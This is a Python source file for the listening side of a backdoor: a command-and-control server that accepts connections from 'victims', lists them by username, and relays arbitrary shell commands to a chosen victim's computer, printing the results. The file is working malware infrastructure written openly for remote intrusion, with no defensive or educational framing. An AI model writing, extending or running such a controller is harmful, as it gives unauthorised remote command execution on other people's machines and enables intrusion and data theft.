#!/usr/bin/env python3

import socket
import os
import sys
from threading import Thread
from time import sleep
from bullet import ScrollBar, utils

BUFFER_SIZE = 1025
PAYLOAD_END_CHAR = b'\04' # end of transmission

PORT = 8080

# Scroll Input
SCROLL_HEIGHT = 5
REFRESH = 'refresh'
QUIT = 'quit'

victims = dict()
server = None

class Server:
  server = None
  victims = dict()

  def _listen(self):
    self.server.listen()
    while True:
      try:
        victim_socket = self.server.accept()[0]
        victim_username = victim_socket.recv(BUFFER_SIZE).decode() # Victim first send his username
        self.victims[victim_username] = victim_socket # We store each victim_sockets with theirs usernames
      except:
        break

  def start(self):
    self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create TCP server
    self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allow REUSEADDR to avoid error while another server is already running
    self.server.bind(('', PORT)) # Bind server on PORT
    Thread(target=self._listen).start()

  def close(self):
    self.server.shutdown(socket.SHUT_RDWR)
    self.server.close()

  def wait_victims(self):
    """Just wait until we have victims."""
    msg = ' > awaiting connections ...'
    print(msg, end='\r')

    sleep(2)
    while not self.victims:
      sleep(1)

    print(' ' * len(msg), end='\r')

  def select_victim(self):
    """Ask to the hoster which victim he want to interact with."""
    user_choice = None

    while True:
      try:
        self.wait_victims()
      except KeyboardInterrupt:
        break

      choices = [REFRESH, *self.victims, QUIT]
      cli = ScrollBar('Select your victim :'
                      , choices=choices
                      , height=SCROLL_HEIGHT)

      try:
        user_choice = cli.launch()
      except KeyboardInterrupt:
        break
      finally:
        utils.clearConsoleUp(SCROLL_HEIGHT - 1)

      if user_choice == QUIT:
        break
      if user_choice == REFRESH:
        continue
      return user_choice

  def interact_with_victim(self, victim_username):
    victim_socket = self.victims.get(victim_username, None)
    if not victim_socket:
      # Victim is unfound.
      return

    def send_cmd(cmd):
      """Send the command to the victim."""
      victim_socket.send(cmd.encode())

    def get_response():
      """Read from the socket until he found the PAYLOAD_END_CHAR.
      This allows us to receive response that exceed the buffer size."""
      response = b''
      while True:
        response += victim_socket.recv(BUFFER_SIZE)
        if response[-1] == PAYLOAD_END_CHAR[0]:
          break
      return response[:-1].decode()

    print(f'You are now in the "{victim_username}" computer 🤫')
    while True:
      try:
        cmd = input() # Get the user command
        send_cmd(cmd) # Send the command to the victim
        response = get_response() # Get the victim's response of the command
        print(response) # Print the victim's response
      except KeyboardInterrupt:
        break
    print('See you soon 🖖🏻', end='\n\n')

def main():
  server = Server()
  server.start()

  while True:
    victim = server.select_victim()
    if not victim:
      break # If not victim are selected stop the program.
    server.interact_with_victim(victim)

  server.close()
  print('Backdoor is now closed 🙈')

if __name__ == '__main__':
  main()
